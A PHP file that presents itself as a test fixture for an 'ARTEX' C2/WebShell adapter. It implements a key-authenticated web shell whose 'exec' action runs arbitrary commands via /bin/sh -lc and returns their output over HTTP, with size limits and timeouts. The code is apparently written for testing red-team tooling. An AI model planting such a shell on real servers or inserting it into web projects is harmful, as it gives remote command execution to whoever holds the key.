<?php
// ARTEX test fixture — http_phpcmd wire protocol.
//
// This file exists only to validate the C2/WebShell adapter against a real
// HTTP/PHP endpoint. It is deliberately small, stateless and free of eval /
// upload / PTY features. Do not deploy it to a production path.
//
// Protocol (self-authored for ARTEX, not a copy of any public shell):
//   POST <base_url>  Content-Type: application/json  X-Shell-Key: <secret>
//   {"v":1,"id":"...","action":"ping|info|exec","cmd":"...","nonce":"...","ts":N,"args":{...}}
//   reply 200 {"ok":true,"action":"exec","exit_code":0,"stdout_b64":"...","stderr_b64":"...",
//              "timed_out":false,"truncated":false}
//   error  {"ok":false,"error":{"code":"unauthorized","message":"..."}}
//
// The key is read from ARTEX_SHELL_KEY or ARTEX_SHELL_KEY_FILE, never echoed.

declare(strict_types=1);

const MAX_BODY = 16384;
const MAX_ARG_ITEMS = 32;
const MAX_ARG_BYTES = 512;
const MAX_ARGV_TOTAL = 4096;
const MAX_STREAM = 48 * 1024;
const MAX_TOTAL = 64 * 1024;
const DEFAULT_TIMEOUT_MS = 5000;
const MAX_TIMEOUT_MS = 10000;

function reply(int $status, array $payload): void
{
    http_response_code($status);
    header('Content-Type: application/json');
    header('Cache-Control: no-store');
    header('X-Content-Type-Options: nosniff');
    echo json_encode($payload, JSON_UNESCAPED_SLASHES);
    exit;
}

function fail(int $status, string $code, string $message): void
{
    reply($status, ['ok' => false, 'error' => ['code' => $code, 'message' => $message]]);
}

function expected_key(): string
{
    $file = getenv('ARTEX_SHELL_KEY_FILE');
    if (is_string($file) && $file !== '' && is_readable($file)) {
        $raw = trim((string) file_get_contents($file));
        if ($raw !== '') {
            return $raw;
        }
    }
    $direct = getenv('ARTEX_SHELL_KEY');
    return is_string($direct) ? trim($direct) : '';
}

function presented_key(): string
{
    $header = $_SERVER['HTTP_X_SHELL_KEY'] ?? ($_SERVER['HTTP_X_ARTEX_KEY'] ?? '');
    return is_string($header) ? $header : '';
}

function key_matches(string $expected, string $presented): bool
{
    if (strlen($expected) < 32 || $presented === '') {
        return false;
    }
    // Constant-time comparison that does not leak length through timing.
    return hash_equals(hash('sha256', $expected), hash('sha256', $presented));
}

function can_exec(): bool
{
    $disabled = array_map('trim', explode(',', (string) ini_get('disable_functions')));
    return function_exists('proc_open') && !in_array('proc_open', $disabled, true);
}

function bounded_append(string $buffer, string $chunk, int &$total, bool &$truncated): string
{
    $room = MAX_STREAM - strlen($buffer);
    if ($room > 0) {
        $buffer .= substr($chunk, 0, $room);
    }
    if (strlen($chunk) > max(0, $room)) {
        $truncated = true;
    }
    $total += strlen($chunk);
    if ($total > MAX_TOTAL) {
        $truncated = true;
    }
    return $buffer;
}

// run_argv executes a real argv array without a shell. Timeout is enforced by a
// non-blocking read loop plus SIGKILL, with a hard stop slightly after.
function run_argv(array $argv, string $cwd, int $timeoutMs): array
{
    $cwd = $cwd !== '' ? $cwd : '/tmp';
    if (!is_dir($cwd)) {
        $cwd = '/tmp';
    }
    $env = ['PATH' => '/usr/local/bin:/usr/bin:/bin', 'HOME' => '/tmp', 'LANG' => 'C.UTF-8'];
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $started = microtime(true);
    $process = @proc_open($argv, $descriptors, $pipes, $cwd, $env);
    if (!is_resource($process)) {
        fail(500, 'spawn_failed', 'process could not be started');
    }
    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);

    $stdout = '';
    $stderr = '';
    $total = 0;
    $truncated = false;
    $timedOut = false;
    $deadline = $started + ($timeoutMs / 1000.0);
    $hardStop = $deadline + 1.0;

    while (true) {
        $read = [];
        $write = null;
        $except = null;
        if (!feof($pipes[1])) {
            $read[] = $pipes[1];
        }
        if (!feof($pipes[2])) {
            $read[] = $pipes[2];
        }
        if ($read === []) {
            break;
        }
        $now = microtime(true);
        if ($now >= $hardStop) {
            $timedOut = true;
            break;
        }
        $wait = (int) max(0, min(200000, ($hardStop - $now) * 1000000));
        $ready = @stream_select($read, $write, $except, 0, $wait);
        if ($ready === false) {
            break;
        }
        if ($ready === 0) {
            continue;
        }
        foreach ($read as $stream) {
            $chunk = (string) fread($stream, 8192);
            if ($chunk === '' && feof($stream)) {
                continue;
            }
            if ($stream === $pipes[1]) {
                $stdout = bounded_append($stdout, $chunk, $total, $truncated);
            } else {
                $stderr = bounded_append($stderr, $chunk, $total, $truncated);
            }
        }
    }
    if (microtime(true) >= $deadline) {
        $timedOut = true;
    }
    fclose($pipes[1]);
    fclose($pipes[2]);

    $exitCode = null;
    if ($timedOut) {
        // Kill the direct child so the request returns promptly after a timeout.
        $status = proc_get_status($process);
        if (is_array($status) && ($status['running'] ?? false)) {
            @proc_terminate($process, 9);
        }
    } else {
        $status = proc_get_status($process);
        if (is_array($status) && ($status['running'] ?? false)) {
            // The pipes closed but the child has not been reaped yet.
            $waitUntil = microtime(true) + 0.5;
            while ($status['running'] && microtime(true) < $waitUntil) {
                usleep(10000);
                $status = proc_get_status($process);
            }
        }
        if (is_array($status) && !$status['running']) {
            $exitCode = (int) $status['exitcode'];
            if ($exitCode === -1) {
                $exitCode = null;
            }
        } else {
            @proc_terminate($process, 9);
        }
    }
    @proc_close($process);

    return [
        'stdout' => $stdout,
        'stderr' => $stderr,
        'exit_code' => $timedOut ? null : $exitCode,
        'timed_out' => $timedOut,
        'truncated' => $truncated,
        'duration_ms' => (int) round((microtime(true) - $started) * 1000),
    ];
}

function validate_argv(mixed $argv): ?array
{
    if (!is_array($argv) || $argv === [] || count($argv) > MAX_ARG_ITEMS) {
        return null;
    }
    $total = 0;
    $clean = [];
    foreach ($argv as $item) {
        if (!is_string($item) || strlen($item) > MAX_ARG_BYTES || str_contains($item, "\0")) {
            return null;
        }
        $total += strlen($item);
        $clean[] = $item;
    }
    return $total > MAX_ARGV_TOTAL ? null : $clean;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Allow: POST');
    fail(405, 'denied', 'only POST is accepted');
}
$expected = expected_key();
if ($expected === '') {
    fail(503, 'misconfigured', 'shell key is not configured');
}
if (!key_matches($expected, presented_key())) {
    fail(401, 'unauthorized', 'key rejected');
}
if (isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] !== '') {
    fail(400, 'query_not_allowed', 'credentials must not travel in the query string');
}
$contentLength = (int) ($_SERVER['CONTENT_LENGTH'] ?? 0);
if ($contentLength <= 0) {
    fail(411, 'bad_json', 'Content-Length is required');
}
if ($contentLength > MAX_BODY) {
    fail(413, 'too_large', 'request body is too large');
}
$raw = (string) file_get_contents('php://input', false, null, 0, MAX_BODY + 1);
if (strlen($raw) > MAX_BODY) {
    fail(413, 'too_large', 'request body is too large');
}
$payload = json_decode($raw, true, 8);
if (!is_array($payload)) {
    fail(400, 'bad_json', 'request body must be a JSON object');
}
$allowed = ['v', 'id', 'action', 'cmd', 'nonce', 'ts', 'args'];
foreach (array_keys($payload) as $key) {
    if (!in_array($key, $allowed, true)) {
        fail(400, 'bad_json', 'unknown request field');
    }
}
$action = $payload['action'] ?? '';
if (!is_string($action) || !in_array($action, ['ping', 'info', 'exec'], true)) {
    fail(400, 'bad_json', 'unknown action');
}
$id = $payload['id'] ?? '';
if (!is_string($id) || strlen($id) > 128) {
    fail(400, 'bad_id', 'id is required');
}

$base = ['v' => 1, 'id' => $id, 'ok' => true, 'action' => $action];

if ($action === 'ping') {
    reply(200, $base + ['pong' => true, 'server_time' => gmdate('c')]);
}

if ($action === 'info') {
    reply(200, $base + [
        'php_version' => PHP_VERSION,
        'sapi' => PHP_SAPI,
        'user' => function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown',
        'can_exec' => can_exec(),
        'disabled_functions' => (string) ini_get('disable_functions'),
    ]);
}

// action === 'exec'
if (!can_exec()) {
    fail(501, 'disabled', 'proc_open is not available');
}
$args = $payload['args'] ?? [];
if (!is_array($args)) {
    fail(400, 'bad_argv', 'args must be an object');
}
$cwd = is_string($args['cwd'] ?? null) ? (string) $args['cwd'] : '/tmp';
$timeoutMs = DEFAULT_TIMEOUT_MS;
if (isset($args['timeout_ms'])) {
    if (!is_int($args['timeout_ms']) || $args['timeout_ms'] < 1 || $args['timeout_ms'] > MAX_TIMEOUT_MS) {
        fail(400, 'bad_argv', 'timeout_ms must be an integer between 1 and ' . MAX_TIMEOUT_MS);
    }
    $timeoutMs = $args['timeout_ms'];
}
$cmd = $payload['cmd'] ?? '';
if (!is_string($cmd) || str_contains($cmd, "\0") || strlen($cmd) > 4096) {
    fail(400, 'bad_argv', 'cmd must be a string up to 4096 bytes');
}
$argv = null;
if (isset($args['argv'])) {
    $argv = validate_argv($args['argv']);
    if ($argv === null) {
        fail(400, 'bad_argv', 'argv must be 1-32 items of at most 512 bytes each');
    }
} elseif ($cmd !== '') {
    $argv = ['/bin/sh', '-lc', $cmd];
} else {
    fail(400, 'bad_argv', 'exec requires args.argv or cmd');
}
$result = run_argv($argv, $cwd, $timeoutMs);
reply(200, $base + [
    'exit_code' => $result['exit_code'],
    'timed_out' => $result['timed_out'],
    'truncated' => $result['truncated'],
    'stdout_b64' => base64_encode($result['stdout']),
    'stderr_b64' => base64_encode($result['stderr']),
    'duration_ms' => $result['duration_ms'],
]);
